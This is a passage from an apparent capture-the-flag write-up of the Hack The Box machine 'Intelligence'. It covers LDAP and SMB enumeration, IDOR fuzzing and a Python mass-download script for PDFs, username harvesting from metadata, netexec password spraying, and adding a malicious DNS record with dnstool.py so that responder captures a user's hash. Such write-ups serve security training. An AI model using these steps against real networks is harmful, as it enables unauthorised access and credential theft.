+</span></span><span style="display:flex;"><span>  Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 255.43 seconds</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><strong>Discoveries</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-27-172807_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="dns-53">DNS <code>53</code>:</h3>
+<ul>
+<li>As this is a Domain Controller it is running the DNS service.</li>
+<li>I run <code>dnsenum</code> to enumerate the DNS service:
+<ul>
+<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt intelligence.htb</code></li>
+<li><figure><img src="/ox-hugo/2024-09-27-182825_.png">
+</figure>
+</li>
+<li>It is just the standard entries for any AD Domain.</li>
+</ul>
+</li>
+</ul>
+<h3 id="ldap-389">LDAP <code>389</code>:</h3>
+<ul>
+<li>
+<p><strong>Using LDAP anonymous bind to enumerate further</strong>:</p>
+<ul>
+<li>If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
+<ul>
+<li>We can actually retrieve a significant amount of information via anonymous bind such as:
+<ul>
+<li>A list of all users</li>
+<li>A list of all groups</li>
+<li>A list of all computers.</li>
+<li>User account attributes.</li>
+<li>The domain password policy.</li>
+<li>Enumerate users who are susceptible to AS-REPRoasting.</li>
+<li>Passwords stored in the description fields</li>
+</ul>
+</li>
+<li>The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here</p>
+<ul>
+<li><a href="https://github.com/bloodstiller/ldapchecker">https://github.com/bloodstiller/ldapchecker</a></li>
+</ul>
+</li>
+<li>
+<p>It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.</p>
+<ol>
+<li>
+<p><!-- raw HTML omitted -->We have the naming context of the domain<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="kali%20in%20~/Desktop/WindowsTools%20%f0%9f%90%8d%20v3.11.9%20%204GiB/7GiB%20%7c%200B/1GiB%20with%20/usr/bin/zsh%0a%f0%9f%95%99%2017:36:54%20zsh%20%e2%9d%af%20python3%20ldapchecker.py%20$box%0aAttempting%20to%20connect%20to%2010.129.95.154%20with%20SSL...%0aConnected%20successfully.%20Retrieving%20server%20information...%0aDSA%20info%20%28from%20DSE%29:%0a%20%20Supported%20LDAP%20versions:%203,%202%0a%20%20Naming%20contexts:%0a%20%20%20%20DC=intelligence,DC=htb%0a%20%20%20%20CN=Configuration,DC=intelligence,DC=htb%0a%20%20%20%20CN=Schema,CN=Configuration,DC=intelligence,DC=htb%0a%20%20%20%20DC=DomainDnsZones,DC=intelligence,DC=htb%0a%20%20%20%20DC=ForestDnsZones,DC=intelligence,DC=htb">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>kali in ~/Desktop/WindowsTools 🐍 v3.11.9  4GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+</span></span><span style="display:flex;"><span>🕙 17:36:54 zsh ❯ python3 ldapchecker.py $box
+</span></span><span style="display:flex;"><span>Attempting to connect to 10.129.95.154 with SSL...
+</span></span><span style="display:flex;"><span>Connected successfully. Retrieving server information...
+</span></span><span style="display:flex;"><span>DSA info <span style="color:#f92672">(</span>from DSE<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>  Supported LDAP versions: 3, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>  Naming contexts:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>intelligence,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>intelligence,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>intelligence,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>intelligence,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>intelligence,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the domain functionaility level<!-- raw HTML omitted -->:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Other:
+</span></span><span style="display:flex;"><span>  domainFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  forestFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  domainControllerFunctionality:
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  rootDomainNamingContext:
+</span></span><span style="display:flex;"><span>    DC<span style="color:#f92672">=</span>intelligence,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>  ldapServiceName:
+</span></span><span style="display:flex;"><span>    intelligence.htb:dc$@INTELLIGENCE.HTB</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>The functionality level determines the minimum version of Windows server that can be used for a DC.
+<ul>
+<li>
+<p>Note that any host os can used on <strong>workstations</strong>, however the functionality level determines what the minimum version for DC&rsquo;s and the forest.</p>
+</li>
+<li>
+<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels</a></p>
+</li>
+<li>
+<p>Knowing the function level is useful as if want to target the DC&rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.</p>
+</li>
+<li>
+<p>In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.</p>
+</li>
+<li>
+<p>Here’s a list of functional level numbers and their corresponding Windows Server operating systems:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Functional Level Number</th>
+          <th style="text-align: left">Corresponding OS</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">0</td>
+          <td style="text-align: left">Windows 2000</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">1</td>
+          <td style="text-align: left">Windows Server 2003 Interim</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">2</td>
+          <td style="text-align: left">Windows Server 2003</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">3</td>
+          <td style="text-align: left">Windows Server 2008</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">4</td>
+          <td style="text-align: left">Windows Server 2008 R2</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">5</td>
+          <td style="text-align: left">Windows Server 2012</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">6</td>
+          <td style="text-align: left">Windows Server 2012 R2</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">7</td>
+          <td style="text-align: left">Windows Server 2016</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">8</td>
+          <td style="text-align: left">Windows Server 2019</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">9</td>
+          <td style="text-align: left">Windows Server 2022</td>
+      </tr>
+  </tbody>
+</table>
+<ul>
+<li>Note:
+<ul>
+<li>Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.</li>
+<li>As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
+<ul>
+<li>Again we can see this has the CN as the base (mentioned previously.) So it appears it&rsquo;s a printer server site of some sort. What is also interesting is the CN name &ldquo;Configuration&rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>DC,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>intelligence,DC<span style="color:#f92672">=</span>htb</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
+<ul>
+<li>We have the naming context.</li>
+<li>Domain name.</li>
+</ul>
+</li>
+</ul>
+<h3 id="smb-445">SMB <code>445</code>:</h3>
+<ul>
+<li>I check if we can use a null session or guest session to connect to the SMB Share:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-27-172540_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="http-80">HTTP <code>80</code>:</h3>
+<ul>
+<li>
+<p>It&rsquo;s running a mostly unfinished website.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-27-174055_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Inspecting the website I the links for two documents &amp; they have a similar naming structure <code>YYYY-DD-MM-upload.pdf</code> &amp; are stored in the <code>documents</code> folder, this naming structure can easily be fuzzed using <strong>FFUF</strong>.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-27-174132_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-09-27-174003_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I do some dirbusting with feroxbuster and can see that there are multiple other entries in the <code>documents</code> folder:</p>
+<ul>
+<li><code>feroxbuster -u http://$box</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-27-174345_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="fuzzing-for-uploads-using-ffuf--finding-idors">Fuzzing for Uploads using FFUF (Finding IDORs):</h4>
+<ul>
+<li>
+<p><strong>Creating a Simple Wordlist</strong>:</p>
+<ul>
+<li>All of seclists are very long so I make a new list from 0-32 using a simple python terminal &amp; save that to my personal wordlists list:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-27-184117_.png">
+</figure>
+
+<ul>
+<li><strong>Note</strong>: It&rsquo;s really important we put the leading zero&rsquo;s by utilizing format string literals as otherwise number&rsquo;s <code>1-9</code> will miss the leading zeros and as we can see this format is utilizing 2 digits to represent the month &amp; day so we would miss potential entries.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Running FFUF</strong>:</p>
+<ul>
+<li><code>ffuf -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:FIRST -w ~/Wordlists/45.06-CustomWordlists/numbersDays-1-31.txt:SECOND -u http://10.129.95.154/Documents/2020-FIRST-SECOND-upload.pdf</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-27-184550_.png">
+</figure>
+</li>
+<li>I get ALOT of hits. To make things easier I am going to script a way to easily download all of these files.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="explanation-of-vulnerability-indirect-object-reference--idor">Explanation of Vulnerability Indirect Object Reference (IDOR):</h4>
+<p>This type of vulnerability is called an Indirect Object Reference or (IDOR)</p>
+<ul>
+<li>
+<p>It is a security flaw where an application exposes a reference to an internal implementation object, such as a file, directory, or database key, without proper authorization checks.</p>
+</li>
+<li>
+<p><strong>Common Examples</strong>:</p>
+<ul>
+<li>Exposed database record IDs in URLs or form fields that can be manipulated to access other users&rsquo; data.</li>
+<li>Direct references to files or directories in the web server that can be accessed or downloaded without proper authentication.
+<ul>
+<li>This is what we took advantage of, just by seeing that there were two PDF&rsquo;s with the same naming structure of <code>YYYY-MM-DD-upload.pdf</code> we were able to fuzz the website and find other files that we should not be able to access and access them.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Prevention Methods</strong>:</p>
+<ul>
+<li>Implementing proper access control checks to ensure users can only access objects they are authorized to.</li>
+<li>Avoiding the use of direct object references in user-accessible inputs whenever possible.</li>
+<li>Using indirect reference maps or tokens to reference internal objects.</li>
+</ul>
+</li>
+<li>
+<p><strong>Further reading on IDORs</strong>:</p>
+<ul>
+<li>How to find IDORs:
+<ul>
+<li><a href="https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489">https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489</a></li>
+</ul>
+</li>
+<li>OWASP:
+<ul>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="scripting-a-simple-mass-down-loader-to-download-the-pdf-s">Scripting a simple mass down-loader to download the PDF&rsquo;s:</h4>
+<ul>
+<li>Here is my script for mass downloading the files from site.</li>
+<li>It&rsquo;s simple in that it essentially fuzzes for every day &amp; month combination &amp; depending on the <code>HTTP</code> response will download the file or print a message saying file not found.</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Days from 01 to 31</span>
+</span></span><span style="display:flex;"><span>days <span style="color:#f92672">=</span> [str(day)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">for</span> day <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">32</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Months from 01 to 12</span>
+</span></span><span style="display:flex;"><span>months <span style="color:#f92672">=</span> [str(month)<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">for</span> month <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">13</span>)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Loop through days and months</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> days:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> months:
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Construct the URL:</span>
+</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://10.129.95.154/Documents/2020-</span><span style="color:#e6db74">{</span>m<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>d<span style="color:#e6db74">}</span><span style="color:#e6db74">-upload.pdf&#34;</span>
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Check if the request was successful:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Downloading </span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Save the file locally &amp; print message:</span>
+</span></span><span style="display:flex;"><span>            file_name <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;2020-</span><span style="color:#e6db74">{</span>m<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>d<span style="color:#e6db74">}</span><span style="color:#e6db74">-upload.pdf&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(file_name, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>                file<span style="color:#f92672">.</span>write(response<span style="color:#f92672">.</span>content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># If we get a 404 response print that no file was found:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">404</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;No file found at </span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)</span></span></code></pre></div>
+    
+</div>
+<h4 id="converting-the-pdf-s-to-text-using-pdftotext-for-easier-processing">Converting the PDF&rsquo;s to text using <code>pdftotext</code> for easier processing:</h4>
+<ul>
+<li>
+<p>Looking at the results I can see that there is 86 files in there, which is ALOT to manually go through.</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-072202_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Install</strong> <code>poppler-utils</code>:</p>
+<ul>
+<li><code>sudo apt-get install poppler-utils</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Convert the files</strong>:</p>
+<ul>
+<li><code>for p in *pdf; do pdftotext $p; done</code></li>
+<li>This is a simple for loop that iterates through the list of <code>pdfs</code> in the folder and runs <code>pdftotext</code> on them to convert them.</li>
+</ul>
+</li>
+</ul>
+<h4 id="finding-a-default-password-and-a-username-in-a-pdf">Finding a default password &amp; a username in a pdf:</h4>
+<ul>
+<li>After going through the converted pdf&rsquo;s I find a clear-text password
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-073600_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>And a username from an IT user called &ldquo;Ted&rdquo;:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-074702_.png">
+</figure>
+</li>
+<li>Unfortunately this is not a valid username in <code>AD</code> it should be <code>first.lastname</code> for SAM Accounts.</li>
+</ul>
+</li>
+</ul>
+<h4 id="extracting-usernames-from-the-creator-field-of-the-pdf-s">Extracting Usernames from the creator field of the PDF&rsquo;s:</h4>
+<ul>
+<li>
+<p><strong>PDF Metadata Collection</strong>:</p>
+<ul>
+<li>When creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system.</li>
+</ul>
+</li>
+<li>
+<p><strong>System Environment Variables</strong>:</p>
+<ul>
+<li>The logged-in Windows username is part of system environment variables. This is often used to populate fields like &ldquo;<code>Creator</code>&rdquo; in the PDF document.</li>
+</ul>
+</li>
+<li>
+<p><strong>Program Defaults</strong>:</p>
+<ul>
+<li>By default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user.</li>
+</ul>
+</li>
+<li>
+<p><strong>Tracking Ownership</strong>:</p>
+<ul>
+<li>This feature helps track the original creator or author of a document for auditing or document management purposes.</li>
+</ul>
+</li>
+<li>
+<p><strong>Reading the data</strong>:</p>
+<ul>
+<li>We can read the data using the tool <a href="https://linux.die.net/man/1/exiftool">exiftool</a>
+<ul>
+<li>I believe it is installed by default in <a href="https://www.kali.org/tools/libimage-exiftool-perl/">kali</a></li>
+</ul>
+</li>
+<li>It also means we can extract valid SAM account names from the PDFs!</li>
+</ul>
+</li>
+<li>
+<p><strong>Command to extract usernames from pdf metadata &amp; save to a list</strong>:</p>
+<ul>
+<li><code>exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq &gt; userNames.txt</code></li>
+<li>Looking at our results we can see we have valid SAM names &amp; a total user count of 31 users that we have extracted.
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-083118_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="command-breakdown">Command Breakdown</h5>
+<ol>
+<li>
+<p><code>exiftool -Creator -csv *pdf</code></p>
+<ul>
+<li><code>exiftool</code>: Run the tool</li>
+<li><code>-Creator</code>: Extracts the <code>Creator</code> metadata field from the files.</li>
+<li><code>-csv</code>: Outputs the data in CSV format.
+<ul>
+<li>This is the most important part for the rest of the command to work:
+<ul>
+<li>The <code>CSV</code> format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF&rsquo;s metadata is presented as a row, and each field (like &ldquo;<code>Creator</code>&rdquo;) is a column. This makes it easier to process the data programmatically.</li>
+<li><strong>Simplicity</strong>: When using tools like <code>cut</code>, it’s easier to extract specific fields by referring to column numbers (e.g., <code>-f2</code> for the second column), which is straightforward with <code>CSV</code> formatting.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>*pdf</code>: Targets all PDF files in the current directory.</li>
+</ul>
+</li>
+<li>
+<p><code>| cut -d, -f2</code></p>
+<ul>
+<li><code>|</code>: Pipes the output from the previous command into the next.</li>
+<li><code>cut</code>: Extracts specific fields from the CSV output.</li>
+<li><code>-d,</code>: Uses a comma as the delimiter (since it&rsquo;s CSV data).</li>
+<li><code>-f2</code>: Selects the second field, which contains the creator name.</li>
+</ul>
+</li>
+<li>
+<p><code>| sort</code>: Sorts the creator names alphabetically.</p>
+</li>
+<li>
+<p><code>| uniq</code>: Removes duplicate names, leaving only unique entries.</p>
+</li>
+<li>
+<p><code>&gt; userNames.txt</code></p>
+<ul>
+<li>Redirects the final output (unique creator names) into a file named <code>userNames.txt</code></li>
+</ul>
+</li>
+</ol>
+<h2 id="2-dot-foothold">2. Foothold:</h2>
+<h3 id="credential-stuffing-with-netexec">Credential Stuffing with netexec:</h3>
+<ul>
+<li><strong>Credential Stuffing</strong>:
+<ul>
+<li><code>netexec smb $box -u userList.txt -p $pass --shares --continue-on-success | grep [+]</code></li>
+<li><strong>We get a hit</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-083833_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>We can see she has access to some interesting shares, namely <code>IT</code>, <code>Users</code> &amp; <code>Sysvol</code>.</li>
+</ul>
+</li>
+</ul>
+<h3 id="credentialed-smb-enumeration">Credentialed SMB Enumeration:</h3>
+<h4 id="enumerating-users-share">Enumerating Users Share:</h4>
+<ul>
+<li>Connecting to the users share I find it is as it says a list of user directories:</li>
+<li><figure><img src="/ox-hugo/2024-09-29-085343_.png">
+</figure>
+</li>
+<li>I get the <code>user.txt</code> flag:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-085609_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-09-29-085629_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I check the <code>SYSVOL</code> share but there is nothing of note there.</li>
+<li>I also asreproasted &amp; kerberoasted using netexec, nothing of note.</li>
+<li>I checked the <code>NETLOGON</code> share.</li>
+<li>I also tried secrets-dump (sometimes great to do with a low-priv account as you never know what you will get)</li>
+</ul>
+<h4 id="finding-a-user-script">Finding a user script:</h4>
+<ul>
+<li>I connect to the IT share and find a file called <code>downdetector.ps1</code></li>
+<li><figure><img src="/ox-hugo/2024-09-29-084208_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-09-29-084834_.png">
+</figure>
+
+<ul>
+<li>Looking at the script it checks if any hosts with a DNS name that starts with <code>web</code> are down every 5 minutes and then emails <code>Ted.Graves</code>. What using is particularly interesting about this though is that it sends a <strong>Credentialed Request</strong> using the user <code>Ted.Graves</code> <code>-UseDefaultCredentials</code> to each of the entries; meaning if we can get it to try to authenticate to us by adding a fake <code>DNS</code> entry we can potentially grab <code>Ted.Graves</code> credentials!!! As he is receiving these emails we can safely assume he is either part of IT or networking (plus this is probably the script that was referenced in the PDF&rsquo;s we pulled).</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-lateral-movement-and-privilege-escalation">3. Lateral Movement &amp; Privilege Escalation:</h2>
+<h3 id="adding-a-malicious-dns-entry-using-dnstool-dot-py">Adding a Malicious DNS Entry using <code>dnstool.py</code>:</h3>
+<ul>
+<li>We can use the tool <a href="https://github.com/dirkjanm/krbrelayx">dnstool</a> which is part of <a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a>.
+<ul>
+<li>This tool enables us to &ldquo;Add/modify/delete Active Directory Integrated DNS records via LDAP.&rdquo;</li>
+</ul>
+</li>
+</ul>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->__<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->-</p>
+<ul>
+<li>
+<p><strong>Clone The Repo</strong>:</p>
+<ul>
+<li><code>git clone https://github.com/dirkjanm/krbrelayx.git /opt/krbrelayx</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I start</strong> <a href="https://www.kali.org/tools/responder/">responder</a>:</p>
+<ul>
+<li><code>sudo responder -v -I tun0</code></li>
+<li><figure><img src="/ox-hugo/2024-09-29-100651_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I make <code>dns</code>  entry</strong>:</p>
+<ul>
+<li><code>python3 dnstool.py $box -u intelligence\\$user -p $pass --action add --record web-bloodstiller --data $myip --type A</code></li>
+<li><strong>Note</strong>:
+<ul>
+<li>It requires the hostname/ip as an argument but there is no flag for it, it just accepts it.</li>
+<li><figure><img src="/ox-hugo/2024-09-29-101431_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>We capture a hash for</strong> <code>ted.graves</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-101932_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="why-can-we-just-add-malicious-dns-entries-to-a-domain-controller">Why can we just add malicious DNS entries to a Domain Controller?:</h4>
+<ul>
+<li>So I had to go searching for this information as I was not sure if this vulnerability was the result of our user <code>Tiffany.Molina</code> having this privilege.
+<ul>
+<li>There is no evidence she is part of any DNS administration groups:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-29-152328_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I read some sources saying that by default any authenticated user can add DNS entries in an AD environment.
+<ul>
+<li>
+<p><a href="https://ippsec.rocks/#">ippsec</a> also states this <a href="https://youtu.be/Jg_BjkxdtsE?si=k7tT5SqHvuZYvPn-&amp;t=1666">here</a></p>
+</li>
+<li>
+<p>Whereas Kevin Robertson (creator of <a href="https://github.com/Kevin-Robertson/Powermad">PowerMad</a> &amp; <a href="https://github.com/Kevin-Robertson/Inveigh/tree/dev">Inveigh</a>) states:</p>
+<blockquote>
+<p>Modifying ADIDNS Zones
+There are two primary methods of remotely modifying an ADIDNS zone. The first involves using the RPC based management tools. These tools generally require a DNS administrator or above so I won’t bother describing their capabilities. The second method is DNS dynamic updates. Dynamic updates is a DNS specific protocol designed for modifying DNS zones. Within the AD world, dynamic updates is primarily leveraged by machine accounts to add and update their own DNS records.</p>
+</blockquote>
+<ul>
+<li>Source: <a href="https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/">https://www.netspi.com/blog/technical-blog/network-penetration-testing/exploiting-adidns/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
